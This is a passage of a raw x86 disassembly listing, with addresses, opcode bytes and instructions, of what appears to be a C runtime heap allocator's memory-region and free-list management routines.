  404ce1:	8b d8                	mov    %eax,%ebx
  404ce3:	3b df                	cmp    %edi,%ebx
  404ce5:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404ce8:	73 19                	jae    0x404d03
  404cea:	8b 4b 04             	mov    0x4(%ebx),%ecx
  404ced:	8b 3b                	mov    (%ebx),%edi
  404cef:	23 4d f8             	and    -0x8(%ebp),%ecx
  404cf2:	23 fe                	and    %esi,%edi
  404cf4:	0b cf                	or     %edi,%ecx
  404cf6:	75 0b                	jne    0x404d03
  404cf8:	83 c3 14             	add    $0x14,%ebx
  404cfb:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  404cfe:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404d01:	72 e7                	jb     0x404cea
  404d03:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  404d06:	75 79                	jne    0x404d81
  404d08:	8b da                	mov    %edx,%ebx
  404d0a:	3b d8                	cmp    %eax,%ebx
  404d0c:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404d0f:	73 15                	jae    0x404d26
  404d11:	8b 4b 04             	mov    0x4(%ebx),%ecx
  404d14:	8b 3b                	mov    (%ebx),%edi
  404d16:	23 4d f8             	and    -0x8(%ebp),%ecx
  404d19:	23 fe                	and    %esi,%edi
  404d1b:	0b cf                	or     %edi,%ecx
  404d1d:	75 05                	jne    0x404d24
  404d1f:	83 c3 14             	add    $0x14,%ebx
  404d22:	eb e6                	jmp    0x404d0a
  404d24:	3b d8                	cmp    %eax,%ebx
  404d26:	75 59                	jne    0x404d81
  404d28:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  404d2b:	73 11                	jae    0x404d3e
  404d2d:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  404d31:	75 08                	jne    0x404d3b
  404d33:	83 c3 14             	add    $0x14,%ebx
  404d36:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404d39:	eb ed                	jmp    0x404d28
  404d3b:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  404d3e:	75 26                	jne    0x404d66
  404d40:	8b da                	mov    %edx,%ebx
  404d42:	3b d8                	cmp    %eax,%ebx
  404d44:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404d47:	73 0d                	jae    0x404d56
  404d49:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  404d4d:	75 05                	jne    0x404d54
  404d4f:	83 c3 14             	add    $0x14,%ebx
  404d52:	eb ee                	jmp    0x404d42
  404d54:	3b d8                	cmp    %eax,%ebx
  404d56:	75 0e                	jne    0x404d66
  404d58:	e8 38 02 00 00       	call   0x404f95
  404d5d:	8b d8                	mov    %eax,%ebx
  404d5f:	85 db                	test   %ebx,%ebx
  404d61:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404d64:	74 14                	je     0x404d7a
  404d66:	53                   	push   %ebx
  404d67:	e8 da 02 00 00       	call   0x405046
  404d6c:	59                   	pop    %ecx
  404d6d:	8b 4b 10             	mov    0x10(%ebx),%ecx
  404d70:	89 01                	mov    %eax,(%ecx)
  404d72:	8b 43 10             	mov    0x10(%ebx),%eax
  404d75:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  404d78:	75 07                	jne    0x404d81
  404d7a:	33 c0                	xor    %eax,%eax
  404d7c:	e9 0f 02 00 00       	jmp    0x404f90
  404d81:	89 1d b0 c1 40 00    	mov    %ebx,0x40c1b0
  404d87:	8b 43 10             	mov    0x10(%ebx),%eax
  404d8a:	8b 10                	mov    (%eax),%edx
  404d8c:	83 fa ff             	cmp    $0xffffffff,%edx
  404d8f:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404d92:	74 14                	je     0x404da8
  404d94:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  404d9b:	8b 7c 90 44          	mov    0x44(%eax,%edx,4),%edi
  404d9f:	23 4d f8             	and    -0x8(%ebp),%ecx
  404da2:	23 fe                	and    %esi,%edi
  404da4:	0b cf                	or     %edi,%ecx
  404da6:	75 37                	jne    0x404ddf
  404da8:	8b 90 c4 00 00 00    	mov    0xc4(%eax),%edx
  404dae:	8b 70 44             	mov    0x44(%eax),%esi
  404db1:	23 55 f8             	and    -0x8(%ebp),%edx
  404db4:	23 75 f4             	and    -0xc(%ebp),%esi
  404db7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404dbb:	8d 48 44             	lea    0x44(%eax),%ecx
  404dbe:	0b d6                	or     %esi,%edx
  404dc0:	8b 75 f4             	mov    -0xc(%ebp),%esi
  404dc3:	75 17                	jne    0x404ddc
  404dc5:	8b 91 84 00 00 00    	mov    0x84(%ecx),%edx
  404dcb:	ff 45 fc             	incl   -0x4(%ebp)
  404dce:	23 55 f8             	and    -0x8(%ebp),%edx
  404dd1:	83 c1 04             	add    $0x4,%ecx
  404dd4:	8b fe                	mov    %esi,%edi
  404dd6:	23 39                	and    (%ecx),%edi
  404dd8:	0b d7                	or     %edi,%edx
  404dda:	74 e9                	je     0x404dc5
  404ddc:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404ddf:	8b ca                	mov    %edx,%ecx
  404de1:	33 ff                	xor    %edi,%edi
  404de3:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  404de9:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  404df0:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404df3:	8b 4c 90 44          	mov    0x44(%eax,%edx,4),%ecx
  404df7:	23 ce                	and    %esi,%ecx
  404df9:	75 0d                	jne    0x404e08
  404dfb:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  404e02:	6a 20                	push   $0x20
  404e04:	23 4d f8             	and    -0x8(%ebp),%ecx
  404e07:	5f                   	pop    %edi
  404e08:	85 c9                	test   %ecx,%ecx
  404e0a:	7c 05                	jl     0x404e11
  404e0c:	d1 e1                	shl    $1,%ecx
  404e0e:	47                   	inc    %edi
  404e0f:	eb f7                	jmp    0x404e08
  404e11:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404e14:	8b 54 f9 04          	mov    0x4(%ecx,%edi,8),%edx
  404e18:	8b 0a                	mov    (%edx),%ecx
  404e1a:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  404e1d:	8b f1                	mov    %ecx,%esi
  404e1f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404e22:	c1 fe 04             	sar    $0x4,%esi
  404e25:	4e                   	dec    %esi
  404e26:	83 fe 3f             	cmp    $0x3f,%esi
  404e29:	7e 03                	jle    0x404e2e
  404e2b:	6a 3f                	push   $0x3f
  404e2d:	5e                   	pop    %esi
  404e2e:	3b f7                	cmp    %edi,%esi
  404e30:	0f 84 0d 01 00 00    	je     0x404f43
  404e36:	8b 4a 04             	mov    0x4(%edx),%ecx
  404e39:	3b 4a 08             	cmp    0x8(%edx),%ecx
  404e3c:	75 61                	jne    0x404e9f
  404e3e:	83 ff 20             	cmp    $0x20,%edi
  404e41:	7d 2b                	jge    0x404e6e
  404e43:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404e48:	8b cf                	mov    %edi,%ecx
  404e4a:	d3 eb                	shr    %cl,%ebx
  404e4c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404e4f:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  404e53:	f7 d3                	not    %ebx
  404e55:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  404e58:	23 5c 88 44          	and    0x44(%eax,%ecx,4),%ebx
  404e5c:	89 5c 88 44          	mov    %ebx,0x44(%eax,%ecx,4)
  404e60:	fe 0f                	decb   (%edi)
  404e62:	75 38                	jne    0x404e9c
  404e64:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404e67:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404e6a:	21 0b                	and    %ecx,(%ebx)
  404e6c:	eb 31                	jmp    0x404e9f
  404e6e:	8d 4f e0             	lea    -0x20(%edi),%ecx
  404e71:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  404e76:	d3 eb                	shr    %cl,%ebx
  404e78:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404e7b:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  404e7f:	8d 8c 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%ecx
  404e86:	f7 d3                	not    %ebx
  404e88:	21 19                	and    %ebx,(%ecx)
  404e8a:	fe 0f                	decb   (%edi)
  404e8c:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  404e8f:	75 0b                	jne    0x404e9c
  404e91:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404e94:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404e97:	21 4b 04             	and    %ecx,0x4(%ebx)
  404e9a:	eb 03                	jmp    0x404e9f
  404e9c:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404e9f:	8b 4a 08             	mov    0x8(%edx),%ecx
  404ea2:	8b 7a 04             	mov    0x4(%edx),%edi
  404ea5:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404ea9:	89 79 04             	mov    %edi,0x4(%ecx)
  404eac:	8b 4a 04             	mov    0x4(%edx),%ecx
  404eaf:	8b 7a 08             	mov    0x8(%edx),%edi
  404eb2:	89 79 08             	mov    %edi,0x8(%ecx)
  404eb5:	0f 84 94 00 00 00    	je     0x404f4f
  404ebb:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404ebe:	8b 7c f1 04          	mov    0x4(%ecx,%esi,8),%edi
  404ec2:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  404ec5:	89 7a 04             	mov    %edi,0x4(%edx)
  404ec8:	89 4a 08             	mov    %ecx,0x8(%edx)
  404ecb:	89 51 04             	mov    %edx,0x4(%ecx)
  404ece:	8b 4a 04             	mov    0x4(%edx),%ecx
  404ed1:	89 51 08             	mov    %edx,0x8(%ecx)
  404ed4:	8b 4a 04             	mov    0x4(%edx),%ecx
  404ed7:	3b 4a 08             	cmp    0x8(%edx),%ecx
  404eda:	75 64                	jne    0x404f40
  404edc:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  404ee0:	83 fe 20             	cmp    $0x20,%esi
  404ee3:	88 4d 0b             	mov    %cl,0xb(%ebp)
  404ee6:	7d 29                	jge    0x404f11
  404ee8:	fe c1                	inc    %cl
  404eea:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  404eee:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  404ef2:	75 0b                	jne    0x404eff
  404ef4:	bf 00 00 00 80       	mov    $0x80000000,%edi
  404ef9:	8b ce                	mov    %esi,%ecx
  404efb:	d3 ef                	shr    %cl,%edi
  404efd:	09 3b                	or     %edi,(%ebx)
  404eff:	bf 00 00 00 80       	mov    $0x80000000,%edi
  404f04:	8b ce                	mov    %esi,%ecx
  404f06:	d3 ef                	shr    %cl,%edi
  404f08:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f0b:	09 7c 88 44          	or     %edi,0x44(%eax,%ecx,4)
  404f0f:	eb 2f                	jmp    0x404f40
  404f11:	fe c1                	inc    %cl
  404f13:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  404f17:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  404f1b:	75 0d                	jne    0x404f2a
  404f1d:	8d 4e e0             	lea    -0x20(%esi),%ecx
  404f20:	bf 00 00 00 80       	mov    $0x80000000,%edi
  404f25:	d3 ef                	shr    %cl,%edi
  404f27:	09 7b 04             	or     %edi,0x4(%ebx)
  404f2a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f2d:	8d bc 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%edi
  404f34:	8d 4e e0             	lea    -0x20(%esi),%ecx
  404f37:	be 00 00 00 80       	mov    $0x80000000,%esi
  404f3c:	d3 ee                	shr    %cl,%esi
  404f3e:	09 37                	or     %esi,(%edi)
  404f40:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404f43:	85 c9                	test   %ecx,%ecx
  404f45:	74 0b                	je     0x404f52
  404f47:	89 0a                	mov    %ecx,(%edx)
  404f49:	89 4c 11 fc          	mov    %ecx,-0x4(%ecx,%edx,1)
  404f4d:	eb 03                	jmp    0x404f52
  404f4f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404f52:	8b 75 f0             	mov    -0x10(%ebp),%esi
  404f55:	03 d1                	add    %ecx,%edx
  404f57:	8d 4e 01             	lea    0x1(%esi),%ecx
  404f5a:	89 0a                	mov    %ecx,(%edx)
  404f5c:	89 4c 32 fc          	mov    %ecx,-0x4(%edx,%esi,1)
  404f60:	8b 75 f4             	mov    -0xc(%ebp),%esi
  404f63:	8b 0e                	mov    (%esi),%ecx
  404f65:	85 c9                	test   %ecx,%ecx
  404f67:	8d 79 01             	lea    0x1(%ecx),%edi
  404f6a:	89 3e                	mov    %edi,(%esi)
  404f6c:	75 1a                	jne    0x404f88
  404f6e:	3b 1d b4 c1 40 00    	cmp    0x40c1b4,%ebx
  404f74:	75 12                	jne    0x404f88
  404f76:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f79:	3b 0d ac c1 40 00    	cmp    0x40c1ac,%ecx
  404f7f:	75 07                	jne    0x404f88
  404f81:	83 25 b4 c1 40 00 00 	andl   $0x0,0x40c1b4
  404f88:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f8b:	89 08                	mov    %ecx,(%eax)
  404f8d:	8d 42 04             	lea    0x4(%edx),%eax
  404f90:	5f                   	pop    %edi
  404f91:	5e                   	pop    %esi
  404f92:	5b                   	pop    %ebx
  404f93:	c9                   	leave
  404f94:	c3                   	ret
  404f95:	a1 b8 c1 40 00       	mov    0x40c1b8,%eax
  404f9a:	8b 0d a8 c1 40 00    	mov    0x40c1a8,%ecx
  404fa0:	56                   	push   %esi
  404fa1:	57                   	push   %edi
  404fa2:	33 ff                	xor    %edi,%edi
  404fa4:	3b c1                	cmp    %ecx,%eax
  404fa6:	75 30                	jne    0x404fd8
  404fa8:	8d 44 89 50          	lea    0x50(%ecx,%ecx,4),%eax
  404fac:	c1 e0 02             	shl    $0x2,%eax
  404faf:	50                   	push   %eax
  404fb0:	ff 35 bc c1 40 00    	push   0x40c1bc
  404fb6:	57                   	push   %edi
  404fb7:	ff 35 c4 c1 40 00    	push   0x40c1c4
  404fbd:	ff 15 c0 80 40 00    	call   *0x4080c0
  404fc3:	3b c7                	cmp    %edi,%eax
  404fc5:	74 61                	je     0x405028
  404fc7:	83 05 a8 c1 40 00 10 	addl   $0x10,0x40c1a8
  404fce:	a3 bc c1 40 00       	mov    %eax,0x40c1bc
  404fd3:	a1 b8 c1 40 00       	mov    0x40c1b8,%eax
  404fd8:	8b 0d bc c1 40 00    	mov    0x40c1bc,%ecx
  404fde:	68 c4 41 00 00       	push   $0x41c4
  404fe3:	6a 08                	push   $0x8
  404fe5:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404fe8:	ff 35 c4 c1 40 00    	push   0x40c1c4
  404fee:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  404ff1:	ff 15 b0 80 40 00    	call   *0x4080b0
  404ff7:	3b c7                	cmp    %edi,%eax
  404ff9:	89 46 10             	mov    %eax,0x10(%esi)
  404ffc:	74 2a                	je     0x405028
  404ffe:	6a 04                	push   $0x4
  405000:	68 00 20 00 00       	push   $0x2000
  405005:	68 00 00 10 00       	push   $0x100000
  40500a:	57                   	push   %edi
  40500b:	ff 15 bc 80 40 00    	call   *0x4080bc
  405011:	3b c7                	cmp    %edi,%eax
  405013:	89 46 0c             	mov    %eax,0xc(%esi)
  405016:	75 14                	jne    0x40502c
  405018:	ff 76 10             	push   0x10(%esi)
  40501b:	57                   	push   %edi
  40501c:	ff 35 c4 c1 40 00    	push   0x40c1c4
  405022:	ff 15 74 80 40 00    	call   *0x408074
  405028:	33 c0                	xor    %eax,%eax
  40502a:	eb 17                	jmp    0x405043
  40502c:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  405030:	89 3e                	mov    %edi,(%esi)
  405032:	89 7e 04             	mov    %edi,0x4(%esi)
  405035:	ff 05 b8 c1 40 00    	incl   0x40c1b8
  40503b:	8b 46 10             	mov    0x10(%esi),%eax
  40503e:	83 08 ff             	orl    $0xffffffff,(%eax)
  405041:	8b c6                	mov    %esi,%eax
  405043:	5f                   	pop    %edi
  405044:	5e                   	pop    %esi
  405045:	c3                   	ret
  405046:	55                   	push   %ebp
  405047:	8b ec                	mov    %esp,%ebp
  405049:	51                   	push   %ecx
  40504a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40504d:	53                   	push   %ebx
  40504e:	56                   	push   %esi
  40504f:	57                   	push   %edi
  405050:	8b 71 10             	mov    0x10(%ecx),%esi
  405053:	8b 41 08             	mov    0x8(%ecx),%eax
  405056:	33 db                	xor    %ebx,%ebx
  405058:	85 c0                	test   %eax,%eax
  40505a:	7c 05                	jl     0x405061
  40505c:	d1 e0                	shl    $1,%eax
  40505e:	43                   	inc    %ebx
  40505f:	eb f7                	jmp    0x405058
  405061:	8b c3                	mov    %ebx,%eax
  405063:	6a 3f                	push   $0x3f
  405065:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  40506b:	5a                   	pop    %edx
  40506c:	8d 84 30 44 01 00 00 	lea    0x144(%eax,%esi,1),%eax
  405073:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405076:	89 40 08             	mov    %eax,0x8(%eax)
  405079:	89 40 04             	mov    %eax,0x4(%eax)
  40507c:	83 c0 08             	add    $0x8,%eax
  40507f:	4a                   	dec    %edx
  405080:	75 f4                	jne    0x405076
  405082:	8b fb                	mov    %ebx,%edi
  405084:	6a 04                	push   $0x4
  405086:	c1 e7 0f             	shl    $0xf,%edi
  405089:	03 79 0c             	add    0xc(%ecx),%edi
  40508c:	68 00 10 00 00       	push   $0x1000
  405091:	68 00 80 00 00       	push   $0x8000
  405096:	57                   	push   %edi
  405097:	ff 15 bc 80 40 00    	call   *0x4080bc
  40509d:	85 c0                	test   %eax,%eax
  40509f:	75 08                	jne    0x4050a9
  4050a1:	83 c8 ff             	or     $0xffffffff,%eax
  4050a4:	e9 93 00 00 00       	jmp    0x40513c
  4050a9:	8d 97 00 70 00 00    	lea    0x7000(%edi),%edx
  4050af:	3b fa                	cmp    %edx,%edi
  4050b1:	77 3c                	ja     0x4050ef
  4050b3:	8d 47 10             	lea    0x10(%edi),%eax
  4050b6:	83 48 f8 ff          	orl    $0xffffffff,-0x8(%eax)
  4050ba:	83 88 ec 0f 00 00 ff 	orl    $0xffffffff,0xfec(%eax)
  4050c1:	8d 88 fc 0f 00 00    	lea    0xffc(%eax),%ecx
  4050c7:	c7 40 fc f0 0f 00 00 	movl   $0xff0,-0x4(%eax)
  4050ce:	89 08                	mov    %ecx,(%eax)
  4050d0:	8d 88 fc ef ff ff    	lea    -0x1004(%eax),%ecx
  4050d6:	89 48 04             	mov    %ecx,0x4(%eax)
  4050d9:	c7 80 e8 0f 00 00 f0 	movl   $0xff0,0xfe8(%eax)
  4050e0:	0f 00 00 
  4050e3:	05 00 10 00 00       	add    $0x1000,%eax
  4050e8:	8d 48 f0             	lea    -0x10(%eax),%ecx
  4050eb:	3b ca                	cmp    %edx,%ecx
  4050ed:	76 c7                	jbe    0x4050b6
  4050ef:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4050f2:	8d 4f 0c             	lea    0xc(%edi),%ecx
  4050f5:	05 f8 01 00 00       	add    $0x1f8,%eax
  4050fa:	6a 01                	push   $0x1
  4050fc:	5f                   	pop    %edi
  4050fd:	89 48 04             	mov    %ecx,0x4(%eax)
  405100:	89 41 08             	mov    %eax,0x8(%ecx)
  405103:	8d 4a 0c             	lea    0xc(%edx),%ecx
  405106:	89 48 08             	mov    %ecx,0x8(%eax)
  405109:	89 41 04             	mov    %eax,0x4(%ecx)
  40510c:	83 64 9e 44 00       	andl   $0x0,0x44(%esi,%ebx,4)
  405111:	89 bc 9e c4 00 00 00 	mov    %edi,0xc4(%esi,%ebx,4)
  405118:	8a 46 43             	mov    0x43(%esi),%al
  40511b:	8a c8                	mov    %al,%cl
  40511d:	fe c1                	inc    %cl
  40511f:	84 c0                	test   %al,%al
  405121:	8b 45 08             	mov    0x8(%ebp),%eax
  405124:	88 4e 43             	mov    %cl,0x43(%esi)
  405127:	75 03                	jne    0x40512c
  405129:	09 78 04             	or     %edi,0x4(%eax)
  40512c:	ba 00 00 00 80       	mov    $0x80000000,%edx
  405131:	8b cb                	mov    %ebx,%ecx
  405133:	d3 ea                	shr    %cl,%edx
  405135:	f7 d2                	not    %edx
  405137:	21 50 08             	and    %edx,0x8(%eax)
  40513a:	8b c3                	mov    %ebx,%eax
  40513c:	5f                   	pop    %edi
  40513d:	5e                   	pop    %esi
  40513e:	5b                   	pop    %ebx
  40513f:	c9                   	leave
  405140:	c3                   	ret
  405141:	83 3d e8 99 40 00 ff 	cmpl   $0xffffffff,0x4099e8
  405148:	53                   	push   %ebx
  405149:	55                   	push   %ebp
  40514a:	56                   	push   %esi
  40514b:	57                   	push   %edi
  40514c:	75 07                	jne    0x405155
  40514e:	be d8 99 40 00       	mov    $0x4099d8,%esi
  405153:	eb 1d                	jmp    0x405172
  405155:	68 20 20 00 00       	push   $0x2020
  40515a:	6a 00                	push   $0x0
  40515c:	ff 35 c4 c1 40 00    	push   0x40c1c4
  405162:	ff 15 b0 80 40 00    	call   *0x4080b0
  405168:	8b f0                	mov    %eax,%esi
  40516a:	85 f6                	test   %esi,%esi
  40516c:	0f 84 0c 01 00 00    	je     0x40527e
  405172:	8b 2d bc 80 40 00    	mov    0x4080bc,%ebp
  405178:	6a 04                	push   $0x4
  40517a:	68 00 20 00 00       	push   $0x2000
  40517f:	68 00 00 40 00       	push   $0x400000
  405184:	6a 00                	push   $0x0
  405186:	ff d5                	call   *%ebp
  405188:	8b f8                	mov    %eax,%edi
  40518a:	85 ff                	test   %edi,%edi
  40518c:	0f 84 d5 00 00 00    	je     0x405267
  405192:	6a 04                	push   $0x4
  405194:	bb 00 00 01 00       	mov    $0x10000,%ebx
  405199:	68 00 10 00 00       	push   $0x1000
  40519e:	53                   	push   %ebx
  40519f:	57                   	push   %edi
  4051a0:	ff d5                	call   *%ebp
  4051a2:	85 c0                	test   %eax,%eax
  4051a4:	0f 84 af 00 00 00    	je     0x405259
  4051aa:	b8 d8 99 40 00       	mov    $0x4099d8,%eax
  4051af:	3b f0                	cmp    %eax,%esi
  4051b1:	75 1e                	jne    0x4051d1
  4051b3:	83 3d d8 99 40 00 00 	cmpl   $0x0,0x4099d8
  4051ba:	75 05                	jne    0x4051c1
  4051bc:	a3 d8 99 40 00       	mov    %eax,0x4099d8
  4051c1:	83 3d dc 99 40 00 00 	cmpl   $0x0,0x4099dc
  4051c8:	75 1c                	jne    0x4051e6
  4051ca:	a3 dc 99 40 00       	mov    %eax,0x4099dc
  4051cf:	eb 15                	jmp    0x4051e6
  4051d1:	89 06                	mov    %eax,(%esi)
  4051d3:	a1 dc 99 40 00       	mov    0x4099dc,%eax
  4051d8:	89 46 04             	mov    %eax,0x4(%esi)
  4051db:	89 35 dc 99 40 00    	mov    %esi,0x4099dc
  4051e1:	8b 46 04             	mov    0x4(%esi),%eax
  4051e4:	89 30                	mov    %esi,(%eax)
  4051e6:	8d 87 00 00 40 00    	lea    0x400000(%edi),%eax
  4051ec:	8d 8e 98 00 00 00    	lea    0x98(%esi),%ecx
  4051f2:	89 46 14             	mov    %eax,0x14(%esi)
  4051f5:	8d 46 18             	lea    0x18(%esi),%eax
  4051f8:	89 4e 0c             	mov    %ecx,0xc(%esi)
  4051fb:	89 7e 10             	mov    %edi,0x10(%esi)
  4051fe:	89 46 08             	mov    %eax,0x8(%esi)
  405201:	33 ed                	xor    %ebp,%ebp
  405203:	b9 f1 00 00 00       	mov    $0xf1,%ecx
  405208:	33 d2                	xor    %edx,%edx
  40520a:	83 fd 10             	cmp    $0x10,%ebp
  40520d:	0f 9d c2             	setge  %dl
  405210:	4a                   	dec    %edx
  405211:	23 d1                	and    %ecx,%edx
  405213:	4a                   	dec    %edx
  405214:	45                   	inc    %ebp
  405215:	89 10                	mov    %edx,(%eax)
  405217:	89 48 04             	mov    %ecx,0x4(%eax)
  40521a:	83 c0 08             	add    $0x8,%eax
  40521d:	81 fd 00 04 00 00    	cmp    $0x400,%ebp
  405223:	7c e3                	jl     0x405208
  405225:	53                   	push   %ebx
  405226:	6a 00                	push   $0x0
  405228:	57                   	push   %edi
  405229:	e8 a2 15 00 00       	call   0x4067d0
  40522e:	83 c4 0c             	add    $0xc,%esp
  405231:	8b 46 10             	mov    0x10(%esi),%eax
  405234:	03 c3                	add    %ebx,%eax
  405236:	3b f8                	cmp    %eax,%edi
  405238:	73 1b                	jae    0x405255
  40523a:	80 8f f8 00 00 00 ff 	orb    $0xff,0xf8(%edi)
  405241:	8d 47 08             	lea    0x8(%edi),%eax
  405244:	89 07                	mov    %eax,(%edi)
  405246:	c7 47 04 f0 00 00 00 	movl   $0xf0,0x4(%edi)
  40524d:	81 c7 00 10 00 00    	add    $0x1000,%edi
  405253:	eb dc                	jmp    0x405231
  405255:	8b c6                	mov    %esi,%eax
  405257:	eb 27                	jmp    0x405280
  405259:	68 00 80 00 00       	push   $0x8000
  40525e:	6a 00                	push   $0x0
  405260:	57                   	push   %edi
  405261:	ff 15 a4 80 40 00    	call   *0x4080a4
  405267:	81 fe d8 99 40 00    	cmp    $0x4099d8,%esi
  40526d:	74 0f                	je     0x40527e
  40526f:	56                   	push   %esi
  405270:	6a 00                	push   $0x0
  405272:	ff 35 c4 c1 40 00    	push   0x40c1c4
  405278:	ff 15 74 80 40 00    	call   *0x408074
  40527e:	33 c0                	xor    %eax,%eax
  405280:	5f                   	pop    %edi
  405281:	5e                   	pop    %esi
  405282:	5d                   	pop    %ebp
  405283:	5b                   	pop    %ebx
  405284:	c3                   	ret
  405285:	56                   	push   %esi
  405286:	8b 74 24 08          	mov    0x8(%esp),%esi
  40528a:	68 00 80 00 00       	push   $0x8000
  40528f:	6a 00                	push   $0x0
  405291:	ff 76 10             	push   0x10(%esi)
  405294:	ff 15 a4 80 40 00    	call   *0x4080a4
  40529a:	39 35 f8 b9 40 00    	cmp    %esi,0x40b9f8
  4052a0:	75 08                	jne    0x4052aa
  4052a2:	8b 46 04             	mov    0x4(%esi),%eax
  4052a5:	a3 f8 b9 40 00       	mov    %eax,0x40b9f8
  4052aa:	81 fe d8 99 40 00    	cmp    $0x4099d8,%esi
  4052b0:	74 20                	je     0x4052d2
  4052b2:	8b 46 04             	mov    0x4(%esi),%eax
  4052b5:	8b 0e                	mov    (%esi),%ecx
  4052b7:	56                   	push   %esi
  4052b8:	6a 00                	push   $0x0
  4052ba:	89 08                	mov    %ecx,(%eax)
  4052bc:	8b 06                	mov    (%esi),%eax
  4052be:	8b 4e 04             	mov    0x4(%esi),%ecx
  4052c1:	89 48 04             	mov    %ecx,0x4(%eax)
  4052c4:	ff 35 c4 c1 40 00    	push   0x40c1c4
  4052ca:	ff 15 74 80 40 00    	call   *0x408074
  4052d0:	5e                   	pop    %esi
  4052d1:	c3                   	ret
  4052d2:	83 0d e8 99 40 00 ff 	orl    $0xffffffff,0x4099e8
  4052d9:	5e                   	pop    %esi
  4052da:	c3                   	ret
  4052db:	55                   	push   %ebp
  4052dc:	8b ec                	mov    %esp,%ebp
  4052de:	51                   	push   %ecx
  4052df:	53                   	push   %ebx
  4052e0:	56                   	push   %esi
  4052e1:	8b 35 dc 99 40 00    	mov    0x4099dc,%esi
  4052e7:	57                   	push   %edi
  4052e8:	83 7e 10 ff          	cmpl   $0xffffffff,0x10(%esi)
  4052ec:	0f 84 94 00 00 00    	je     0x405386
  4052f2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4052f6:	8d be 10 20 00 00    	lea    0x2010(%esi),%edi
  4052fc:	bb 00 f0 3f 00       	mov    $0x3ff000,%ebx
  405301:	81 3f f0 00 00 00    	cmpl   $0xf0,(%edi)
  405307:	75 39                	jne    0x405342
  405309:	8b c3                	mov    %ebx,%eax
  40530b:	68 00 40 00 00       	push   $0x4000
  405310:	03 46 10             	add    0x10(%esi),%eax
  405313:	68 00 10 00 00       	push   $0x1000
  405318:	50                   	push   %eax
  405319:	ff 15 a4 80 40 00    	call   *0x4080a4
  40531f:	85 c0                	test   %eax,%eax
  405321:	74 1f                	je     0x405342
  405323:	83 0f ff             	orl    $0xffffffff,(%edi)
  405326:	ff 0d 40 bf 40 00    	decl   0x40bf40
  40532c:	8b 46 0c             	mov    0xc(%esi),%eax
  40532f:	85 c0                	test   %eax,%eax
  405331:	74 04                	je     0x405337
  405333:	3b c7                	cmp    %edi,%eax
  405335:	76 03                	jbe    0x40533a
  405337:	89 7e 0c             	mov    %edi,0xc(%esi)
  40533a:	ff 45 fc             	incl   -0x4(%ebp)
  40533d:	ff 4d 08             	decl   0x8(%ebp)
  405340:	74 0d                	je     0x40534f
  405342:	81 eb 00 10 00 00    	sub    $0x1000,%ebx
  405348:	83 ef 08             	sub    $0x8,%edi
  40534b:	85 db                	test   %ebx,%ebx
  40534d:	7d b2                	jge    0x405301
  40534f:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  405353:	8b ce                	mov    %esi,%ecx
  405355:	8b 76 04             	mov    0x4(%esi),%esi
  405358:	74 2c                	je     0x405386
  40535a:	83 79 18 ff          	cmpl   $0xffffffff,0x18(%ecx)
  40535e:	75 26                	jne    0x405386
  405360:	6a 01                	push   $0x1
  405362:	8d 41 20             	lea    0x20(%ecx),%eax
  405365:	5a                   	pop    %edx
